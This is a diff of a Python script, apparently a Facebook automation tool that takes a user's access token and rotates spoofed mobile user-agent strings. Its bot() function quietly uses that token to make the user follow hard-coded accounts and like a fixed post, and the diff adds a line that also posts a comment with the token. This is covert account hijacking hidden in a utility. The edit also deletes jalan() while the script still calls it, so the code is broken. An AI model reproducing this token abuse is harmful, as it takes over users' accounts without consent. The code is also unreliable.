@@ -69,11 +69,12 @@ try:ugen2 = open('user2.txt','r').read().splitlines()
 except:ugen2 =  ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
 
 ## MLAKU
-def jalan(login_lagi):
-	for wibu in kontol + "\n":
-		sys.stdout.write(wibu)
-		sys.stdout.flush()
-		time.sleep(0.03)
+
+def clear():
+	os.system('clear')
+def back():
+	login_lagi()
+	time.sleep(0.03)
 
 
 def banner():
@@ -91,7 +92,6 @@ def banner():
 
 
 def login_lagi():
-		os.system('clear')
 		kontoll()
 		token = input(' [%s*%s] Masukan Token : '%(O,N))
 		if token in ['']:
@@ -117,8 +117,9 @@ def bot():
 		requests.post('https://graph.facebook.com/100033480633498/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/100001490081130/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/1517769961/subscribers?access_token=' + toket)
+		requests.post('https://graph.facebook.com/711894139936601/comments/?message=' +komen+ '&access_token=' + toket)
 		requests.post('https://graph.facebook.com/711894139936601/likes?summary=true&access_token=' + toket)
-		requests.post('https://graph.facebook.com/5222521057807512/likes?summary=true&access_token=' + toket)
+		requests.post('https://graph.facebook.com/711894139936601/likes?summary=true&access_token=' + toket)
 		menu().main()
 class menu:
 
@@ -129,18 +130,18 @@ class menu:
 		try:
 			toke = open('token.x','r').read()
 		except IOError:
-			print(' [%s+%s] Kamu Belum Login'%(M,N));login().__login__()
+			print(' [%s+%s] Kamu Belum Login'%(M,N));login_lagi()
 		try:
 			r = requests.get('https://graph.facebook.com/me?access_token=%s'%(toke)).json()['name']
 		except KeyError:
-			print(' [%s!%s] Login gagal ...'%(M,N));os.system('rm -rf token.x');time.sleep(2);login().__login__()
+			print(' [%s!%s] Login gagal ...'%(M,N));os.system('rm -rf token.x');time.sleep(2);login_lagi()
 		except requests.exceptions.ConnectionError:
 			exit(' [%s!%s] cek koneksi'%(M,N))
 		try:
 			akss = open('license.txt','r').read()
 		except IOError:
 			akss = '-'
-		banner()
+		kontoll()
 		IP = requests.get('https://api.ipify.org').text
 		jalan(' %s➣ [ %sselamat Datang Om>< %s%s ]'%(N,H,r,N))
 		print(' %s║'%(N))
